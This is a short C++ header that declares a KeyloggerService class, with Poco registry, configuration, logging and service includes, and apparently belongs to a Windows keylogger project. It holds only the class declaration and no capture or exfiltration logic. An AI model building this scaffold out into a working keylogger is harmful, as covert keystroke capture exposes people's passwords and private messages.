#pragma once
#include <windows.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include "Poco/Util/WinRegistryKey.h"
#include "Poco/Util/AbstractConfiguration.h"
#include "Poco/Util/XMLConfiguration.h"
#include "Poco/Util/Application.h"
#include "Poco/Util/Option.h"
#include "Poco/Util/OptionSet.h"
#include "Poco/Util/HelpFormatter.h"
#include "Poco/Util/ServerApplication.h"
#include "Poco/Util/LoggingSubsystem.h"
#include "Poco/Path.h"
#include "Poco/FileStream.h"
#include "Poco/DateTimeFormatter.h"

using Poco::Util::WinRegistryKey;
using Poco::Util::AbstractConfiguration;
using Poco::Util::XMLConfiguration;
using Poco::Util::Application;
using Poco::Util::Option;
using Poco::Util::OptionSet;
using Poco::Util::HelpFormatter;
using Poco::Util::Application;
using Poco::Util::LoggingSubsystem;
using Poco::Path;
using Poco::FileOutputStream;
using Poco::DateTimeFormatter;

class KeyloggerService
{
public:
    KeyloggerService();
    void initialize();

    void uninitialize();

    int main();
protected:
    

private:

    std::string appName;
};